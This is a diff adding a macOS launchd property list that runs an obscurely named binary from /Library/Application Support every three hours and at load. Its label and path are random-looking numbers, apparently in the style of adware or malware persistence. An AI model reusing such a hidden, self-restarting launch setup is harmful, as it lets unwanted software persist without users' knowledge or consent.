@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+	<dict>
+		<key>Label</key>
+		<string>com.9831297697756238837.11001276054</string>
+		<key>ProgramArguments</key>
+		<array>
+			<string>/Library/Application Support/com.16953003392251085856/341971648217646962</string>
+			<string>B88718AA-3FD8-40B4-81C8-F9216DD8E937</string>
+			<string>481BCE9A-C745-43BD-BEC7-08F5FE255585</string>
+		</array>
+		<key>RunAtLoad</key>
+		<true />
+		<key>StartInterval</key>
+		<integer>10800</integer>
+	</dict>
+</plist>
